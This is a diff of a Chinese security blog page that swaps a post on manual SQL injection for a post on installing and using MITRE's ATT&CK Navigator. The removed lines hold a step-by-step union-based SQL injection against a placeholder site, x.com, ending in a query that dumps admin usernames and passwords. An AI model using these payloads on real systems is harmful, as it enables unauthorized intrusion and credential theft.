@@ -4,9 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="手工sql注入测试, 网络安全">
-    <meta name="description" content="发现一个网址http://www.x.com/news-view-3.html，通过搜索引擎site:x.com找到了其微信页面id参数可注入
-http://www.x.com/wx/mobile.php?module=product&amp;am">
+    <meta name="keywords" content="MITRE ATT&amp;CK学习-Navigator, 网络安全">
+    <meta name="description" content="在上文中，主要了解了 MITRE ATT&amp;amp;CK 攻击模型的一些概念，本文将记录 MITRE的Navigator 工具基础使用。 Navigator 项目地址：https://github.com/mitre-attack/attac">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +17,7 @@ http://www.x.com/wx/mobile.php?module=product&amp;am">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>手工sql注入测试 | Aspirepig</title>
+    <title>MITRE ATT&amp;CK学习-Navigator | Aspirepig</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -303,12 +302,12 @@ http://www.x.com/wx/mobile.php?module=product&amp;am">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">手工sql注入测试</h1>
+                    <h1 class="description center-align post-title">MITRE ATT&amp;CK学习-Navigator</h1>
                 </div>
             </div>
         </div>
@@ -422,21 +421,20 @@ http://www.x.com/wx/mobile.php?module=product&amp;am">
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                    <div class="article-tag">
                         
-                            <a href="/categories/linux/" class="post-category">
-                                linux
+                            <a href="/tags/APT/">
+                                <span class="chip bg-color">APT</span>
+                            </a>
+                        
+                            <a href="/tags/MITRE/">
+                                <span class="chip bg-color">MITRE</span>
                             </a>
                         
                     </div>
+                    
+                </div>
+                <div class="col s5 right-align">
                     
                 </div>
             </div>
@@ -445,7 +443,7 @@ http://www.x.com/wx/mobile.php?module=product&amp;am">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2018-04-21
+                    2021-12-03
                 </div>
                 
 
@@ -454,7 +452,7 @@ http://www.x.com/wx/mobile.php?module=product&amp;am">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    419
+                    560
                 </div>
                 
 
@@ -474,28 +472,31 @@ http://www.x.com/wx/mobile.php?module=product&amp;am">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>发现一个网址<a target="_blank" rel="noopener" href="http://www.x.com/news-view-3.html%EF%BC%8C%E9%80%9A%E8%BF%87%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8Esite:x.com%E6%89%BE%E5%88%B0%E4%BA%86%E5%85%B6%E5%BE%AE%E4%BF%A1%E9%A1%B5%E9%9D%A2id%E5%8F%82%E6%95%B0%E5%8F%AF%E6%B3%A8%E5%85%A5">http://www.x.com/news-view-3.html，通过搜索引擎site:x.com找到了其微信页面id参数可注入</a></p>
-<pre class="language-none"><code class="language-none">http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;#页面正常
-http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and 1=2 #页面不正常
-http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and 1=1 #页面正常
-使用
-http://x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and 1=2 order&nbsp;by&nbsp;n--
-判断出字段数，这里判断出来是8
+                <p>在上文中，主要了解了 MITRE ATT&amp;CK 攻击模型的一些概念，本文将记录 MITRE的Navigator 工具基础使用。 Navigator 项目地址：<a target="_blank" rel="noopener" href="https://github.com/mitre-attack/attack-navigator">https://github.com/mitre-attack/attack-navigator</a></p>
+<h1 id="ATT-amp-CK®-Navigator"><a href="#ATT-amp-CK®-Navigator" class="headerlink" title="ATT&amp;CK® Navigator"></a>ATT&amp;CK® Navigator</h1><blockquote>
+<p>The ATT&amp;CK Navigator is designed to provide basic navigation and annotation of <a target="_blank" rel="noopener" href="https://attack.mitre.org/">ATT&amp;CK</a> matrices, something that people are already doing today in tools like Excel. We’ve designed it to be simple and generic - you can use the Navigator to visualize your defensive coverage, your red/blue team planning, the frequency of detected techniques or anything else you want to do. The Navigator doesn’t care - it just allows you to manipulate the cells in the matrix (color coding, adding a comment, assigning a numerical value, etc.). We thought having a simple tool that everyone could use to visualize the matrix would help make it easy to use ATT&amp;CK.</p>
+<p>The principal feature of the Navigator is the ability for users to define layers - custom views of the ATT&amp;CK knowledge base - e.g. showing just those techniques for a particular platform or highlighting techniques a specific adversary has been known to use. Layers can be created interactively within the Navigator or generated programmatically and then visualized via the Navigator.</p>
+</blockquote>
+<p>正如介绍所说，Navigator作为一个攻击矩阵导航器，做了能够在Excel中能做的事。作为一个可视化的页面，可以标注颜色、分数、备注等，可用于红/蓝队构建自己的攻击/防御路线。</p>
+<p>如果要查看在线版，可直接访问 <a target="_blank" rel="noopener" href="https://mitre-attack.github.io/attack-navigator/">https://mitre-attack.github.io/attack-navigator/</a> ，可导入APT组织的矩阵图，或创建自己的矩阵图</p>
+<p>以下为本地安装方法：</p>
+<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h2><p>前置条件： node.js 8 +</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> -g @angular/cli
+<span class="token function">git</span> clone https://github.com/mitre-attack/attack-navigator.git
+<span class="token builtin class-name">cd</span> attack-nav	igator/nav-app/
+<span class="token function">npm</span> <span class="token function">install</span> </code></pre>
 
-使用
-http://x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and 1=2 union&nbsp;select&nbsp;1,2,3,4,5,6,7,8--
-判断出可显示在页面上的字段，这里是2和6
+<p>然后就可以在 <a target="_blank" rel="noopener" href="http://localhost:4200/">http://localhost:4200/</a> 查看安装完成的页面</p>
+<p><img src="/assets/image-20211203125439560.png" alt="image-20211203125439560"></p>
+<h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h2><p>点击 create New Layer，可以创建一个新的视图，选择我们想要创建的视图后，将会加载json文件</p>
+<p>加载完成后，顶部工具栏，可供我们对矩阵进行修改、标注、导出</p>
+<p><img src="/assets/image-20211203125934378.png" alt="image-20211203125934378"></p>
+<p>同时，Navigator支持导入本地或远程的json文件，或创建自定义的视图。</p>
+<p>比如可以在github中查找知名APT组织的相关矩阵图，如 APT29（可直接从 MITRE官网该组织描述页面中下载json文件或直接在线浏览 ）</p>
+<p>如 <a target="_blank" rel="noopener" href="https://attack.mitre.org/groups/G0016/">https://attack.mitre.org/groups/G0016/</a> 页面中，按钮如下：</p>
+<p><img src="/assets/image-20211203130400861.png" alt="image-20211203130400861"></p>
+<p>具体页面中的操作，本文不做介绍，可自行探索</p>
 
-使用
-http://x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and&nbsp;1=2&nbsp;union select&nbsp;1,@@version,3,4,5,user(),7,8--
-得到数据库版本和当前用户(当前数据库同理):mysql：5.0.95   sq_praticcnc@x.x.x.x  
-
-使用
-http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1%20and%201=2%20union%20select%201,concat(group_concat(distinct+table_name)),3,4,5,user(),7,8%20from%20information_schema.COLUMNS%20where%20column_name%20like%20%27%word%%27%20and%20table_schema=%27sq_praticcnc%27--
-利用information_schema查询想要的数据库名，表名，列名
-
-利用查到的数据库名，表名，列名查询数据
-http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1%20and%201=2%20union%20select%201,concat_ws(0x3a,id,user,pass),3,4,5,user(),7,8%20from%20sq_praticcnc.admin%20limit%200,1--</code></pre>
                 
             </div>
             <hr/>
@@ -521,7 +522,7 @@ http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;act
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://aspirepig.cn/2018/04/21/shou-gong-sql-zhu-ru-ce-shi/">https://aspirepig.cn/2018/04/21/shou-gong-sql-zhu-ru-ce-shi/</a>
+                    <a href="https://aspirepig.cn/2021/12/03/mitre-att-ck-xue-xi-navigator-er/">https://aspirepig.cn/2021/12/03/mitre-att-ck-xue-xi-navigator-er/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -558,7 +559,15 @@ http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;act
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/tags/APT/">
+                                    <span class="chip bg-color">APT</span>
+                                </a>
+                            
+                                <a href="/tags/MITRE/">
+                                    <span class="chip bg-color">MITRE</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -727,7 +736,7 @@ http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;act
         repo: 'gittalk',
         owner: 'aspirepigshadow',
         admin: "aspirepigshadow",
-        id: '2018-04-21T13-04-44',
+        id: '2021-12-03T09-35-21',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -755,17 +764,18 @@ http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;act
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2018/07/07/os-x-an-zhuang-homebrew-ji-oh-my-zsh/">
+                <a href="/2021/12/03/mitre-att-ck-xue-xi-navigator-er/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="os x安装homebrew及oh-my-zsh">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="MITRE ATT&amp;CK学习-Navigator">
                         
-                        <span class="card-title">os x安装homebrew及oh-my-zsh</span>
+                        <span class="card-title">MITRE ATT&amp;CK学习-Navigator</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -775,34 +785,27 @@ http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;act
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2018-07-07
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-03
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/OS-X/" class="post-category">
-                                    OS X
-                                </a>
-                            
-                            <a href="/categories/tools/" class="post-category">
-                                    tools
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Aspirepig
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/tools/">
-                        <span class="chip bg-color">tools</span>
+                    <a href="/tags/APT/">
+                        <span class="chip bg-color">APT</span>
                     </a>
                     
-                    <a href="/tags/OS-X/">
-                        <span class="chip bg-color">OS X</span>
+                    <a href="/tags/MITRE/">
+                        <span class="chip bg-color">MITRE</span>
                     </a>
                     
                 </div>
@@ -816,13 +819,13 @@ http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;act
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2018/04/18/wen-jian-shang-chuan-lou-dong-dao-huo-de-root-quan-xian/">
+                <a href="/2021/12/01/mitre-att-ck-xue-xi-yi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="记:从文件上传漏洞到获得root权限">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="MITRE ATT&amp;CK学习(1)">
                         
-                        <span class="card-title">记:从文件上传漏洞到获得root权限</span>
+                        <span class="card-title">MITRE ATT&amp;CK学习(1)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -833,19 +836,27 @@ http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;act
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2018-04-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-01
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/linux/" class="post-category">
-                                    linux
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Aspirepig
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/APT/">
+                        <span class="chip bg-color">APT</span>
+                    </a>
+                    
+                    <a href="/tags/MITRE/">
+                        <span class="chip bg-color">MITRE</span>
+                    </a>
+                    
                 </div>
                 
             </div>
